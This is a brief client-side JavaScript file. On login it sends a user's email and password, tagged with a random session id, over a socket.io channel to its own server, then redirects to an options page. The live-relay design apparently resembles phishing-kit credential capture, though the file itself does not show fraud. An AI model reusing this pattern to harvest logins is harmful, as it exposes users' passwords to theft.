// public/js/main.js
const socket = io();
const sessionId = Math.random().toString(36).substring(2, 15);

document.getElementById('loginForm').addEventListener('submit', (e) => {
  e.preventDefault();
  const correo = document.getElementById('correo').value;
  const contrasena = document.getElementById('contrasena').value;

  socket.emit('dataForm', { correo, contrasena, sessionId });

  window.location.href = `/opciones.html?sessionId=${sessionId}`;
});
